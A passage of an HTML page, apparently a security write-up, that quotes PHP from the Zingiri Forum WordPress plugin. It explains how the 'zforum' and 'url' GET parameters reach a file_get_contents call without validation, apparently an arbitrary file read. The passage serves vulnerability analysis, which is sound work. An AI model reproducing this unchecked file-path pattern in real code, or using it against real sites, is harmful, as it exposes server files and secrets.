		<div id="crayon-53c987717dd71391003178" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function zing_forum_output($process) {
	global $post,$wpdb,$zing_forum_loaded,$zing_forum_to_include,$zing_forum_mode;

	$postVar=array();
	switch ($process)
	{
		case "content":
			if (isset($post)) $cf=get_post_custom($post-&gt;ID);
			if (isset($_GET['zforum']))
			{
				$zing_forum_to_include=$_GET['zforum'];
				$zing_forum_mode="forum";
			}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717dd71391003178-456">456</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd71391003178-457">457</div><div class="crayon-num" data-line="crayon-53c987717dd71391003178-458">458</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd71391003178-459">459</div><div class="crayon-num" data-line="crayon-53c987717dd71391003178-460">460</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd71391003178-461">461</div><div class="crayon-num" data-line="crayon-53c987717dd71391003178-462">462</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd71391003178-463">463</div><div class="crayon-num" data-line="crayon-53c987717dd71391003178-464">464</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd71391003178-465">465</div><div class="crayon-num" data-line="crayon-53c987717dd71391003178-466">466</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd71391003178-467">467</div><div class="crayon-num" data-line="crayon-53c987717dd71391003178-468">468</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717dd71391003178-456"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">zing_forum_output</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">process</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd71391003178-457"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">post</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-i">zing_forum_loaded</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-i">zing_forum_to_include</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-i">zing_forum_mode</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717dd71391003178-458">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd71391003178-459"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">postVar</span><span class="crayon-o">=</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717dd71391003178-460"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">switch</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">process</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd71391003178-461"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987717dd71391003178-462"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-s">"content"</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd71391003178-463"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">post</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">cf</span><span class="crayon-o">=</span><span class="crayon-e">get_post_custom</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">post</span><span class="crayon-o">-&gt;</span><span class="crayon-i">ID</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717dd71391003178-464"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'zforum'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd71391003178-465"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987717dd71391003178-466"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">zing_forum_to_include</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'zforum'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd71391003178-467"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">zing_forum_mode</span><span class="crayon-o">=</span><span class="crayon-s">"forum"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717dd71391003178-468"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0046 seconds] -->
<p>We can affect the value of $zing_forum_to_include through the zforum GET variable. This is then used in a big else if statement. Here is the block of code that is executed if we set that to css:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717dd7a238410306" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
} elseif ($zing_forum_to_include=='css') {
		ob_end_clean();
		if (isset($_GET['stylesheet'])) $key=$_GET['stylesheet'];
		else $key=$_GET['url'];
		if (isset($_SESSION['ccforum']['stylesheet'][$key])) {
			$output=$_SESSION['ccforum']['stylesheet'][$key];
		} else {
			if (isset($_GET['stylesheet'])) {
				$http=zing_forum_http("mybb",'css.php',"");
				$news = new zHttpRequest($http,'zingiri-forum');
				if (!$news-&gt;curlInstalled()) return "cURL not installed";
				elseif (!$news-&gt;live()) return "A HTTP Error occured";
				$output=$news-&gt;DownloadToString();
				$output=str_replace('url(images/','url('.ZING_MYBB_URL.'/images/',$output);

			} elseif ($_GET['url']) {
				$url=$_GET['url'];
				$output=file_get_contents(ZING_MYBB_DIR.'/cache/themes/'.$url);
			}
			$f[]='/^body.*{(.*?)/';
			$r[]=' {$1';
			$f[]='/.zingbody/';
			$r[]='';
			$f[]='/(.*?).{(.*?)/';
			$r[]='.ccforum $1 {$2';
			$f[]='/(.*?),(.*?).{(.*?)/';
			$r[]='$1,.ccforum $2 {$3';
			$f[]='/(.*?),(.*?),(.*?).{(.*?)/';
			$r[]='$1,$2,.ccforum $3 {$4';
			$output=preg_replace($f,$r,$output,-1,$count);
			if ($output) $_SESSION['ccforum']['stylesheet'][$key]=$output;
		}
		header("Content-type: text/css");
		echo $output;
		die();</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717dd7a238410306-541">541</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd7a238410306-542">542</div><div class="crayon-num" data-line="crayon-53c987717dd7a238410306-543">543</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd7a238410306-544">544</div><div class="crayon-num" data-line="crayon-53c987717dd7a238410306-545">545</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd7a238410306-546">546</div><div class="crayon-num" data-line="crayon-53c987717dd7a238410306-547">547</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd7a238410306-548">548</div><div class="crayon-num" data-line="crayon-53c987717dd7a238410306-549">549</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd7a238410306-550">550</div><div class="crayon-num" data-line="crayon-53c987717dd7a238410306-551">551</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd7a238410306-552">552</div><div class="crayon-num" data-line="crayon-53c987717dd7a238410306-553">553</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd7a238410306-554">554</div><div class="crayon-num" data-line="crayon-53c987717dd7a238410306-555">555</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd7a238410306-556">556</div><div class="crayon-num" data-line="crayon-53c987717dd7a238410306-557">557</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd7a238410306-558">558</div><div class="crayon-num" data-line="crayon-53c987717dd7a238410306-559">559</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd7a238410306-560">560</div><div class="crayon-num" data-line="crayon-53c987717dd7a238410306-561">561</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd7a238410306-562">562</div><div class="crayon-num" data-line="crayon-53c987717dd7a238410306-563">563</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd7a238410306-564">564</div><div class="crayon-num" data-line="crayon-53c987717dd7a238410306-565">565</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd7a238410306-566">566</div><div class="crayon-num" data-line="crayon-53c987717dd7a238410306-567">567</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd7a238410306-568">568</div><div class="crayon-num" data-line="crayon-53c987717dd7a238410306-569">569</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd7a238410306-570">570</div><div class="crayon-num" data-line="crayon-53c987717dd7a238410306-571">571</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd7a238410306-572">572</div><div class="crayon-num" data-line="crayon-53c987717dd7a238410306-573">573</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd7a238410306-574">574</div><div class="crayon-num" data-line="crayon-53c987717dd7a238410306-575">575</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717dd7a238410306-541"><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">elseif</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">zing_forum_to_include</span><span class="crayon-o">==</span><span class="crayon-s">'css'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd7a238410306-542"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">ob_end_clean</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717dd7a238410306-543"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'stylesheet'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">key</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'stylesheet'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd7a238410306-544"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">key</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'url'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717dd7a238410306-545"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_SESSION</span><span class="crayon-sy">[</span><span class="crayon-s">'ccforum'</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-s">'stylesheet'</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-i">key</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd7a238410306-546"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">output</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">_SESSION</span><span class="crayon-sy">[</span><span class="crayon-s">'ccforum'</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-s">'stylesheet'</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-i">key</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717dd7a238410306-547"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd7a238410306-548"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'stylesheet'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987717dd7a238410306-549"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">http</span><span class="crayon-o">=</span><span class="crayon-e">zing_forum_http</span><span class="crayon-sy">(</span><span class="crayon-s">"mybb"</span><span class="crayon-sy">,</span><span class="crayon-s">'css.php'</span><span class="crayon-sy">,</span><span class="crayon-s">""</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd7a238410306-550"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">news</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">zHttpRequest</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">http</span><span class="crayon-sy">,</span><span class="crayon-s">'zingiri-forum'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717dd7a238410306-551"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">$</span><span class="crayon-i">news</span><span class="crayon-o">-&gt;</span><span class="crayon-e">curlInstalled</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-s">"cURL not installed"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd7a238410306-552"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">elseif</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">$</span><span class="crayon-i">news</span><span class="crayon-o">-&gt;</span><span class="crayon-e">live</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-s">"A HTTP Error occured"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717dd7a238410306-553"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">output</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-i">news</span><span class="crayon-o">-&gt;</span><span class="crayon-e">DownloadToString</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd7a238410306-554"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">output</span><span class="crayon-o">=</span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">'url(images/'</span><span class="crayon-sy">,</span><span class="crayon-s">'url('</span><span class="crayon-sy">.</span><span class="crayon-v">ZING_MYBB_URL</span><span class="crayon-sy">.</span><span class="crayon-s">'/images/'</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-i">output</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717dd7a238410306-555">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd7a238410306-556"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">elseif</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'url'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987717dd7a238410306-557"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">url</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'url'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd7a238410306-558"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">output</span><span class="crayon-o">=</span><span class="crayon-e">file_get_contents</span><span class="crayon-sy">(</span><span class="crayon-v">ZING_MYBB_DIR</span><span class="crayon-sy">.</span><span class="crayon-s">'/cache/themes/'</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">url</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717dd7a238410306-559"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd7a238410306-560"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">f</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">'/^body.*{(.*?)/'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717dd7a238410306-561"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">' {$1'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd7a238410306-562"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">f</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">'/.zingbody/'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717dd7a238410306-563"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">''</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd7a238410306-564"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">f</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">'/(.*?).{(.*?)/'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717dd7a238410306-565"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">'.ccforum $1 {$2'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd7a238410306-566"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">f</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">'/(.*?),(.*?).{(.*?)/'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717dd7a238410306-567"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">'$1,.ccforum $2 {$3'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd7a238410306-568"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">f</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">'/(.*?),(.*?),(.*?).{(.*?)/'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717dd7a238410306-569"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">'$1,$2,.ccforum $3 {$4'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd7a238410306-570"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">output</span><span 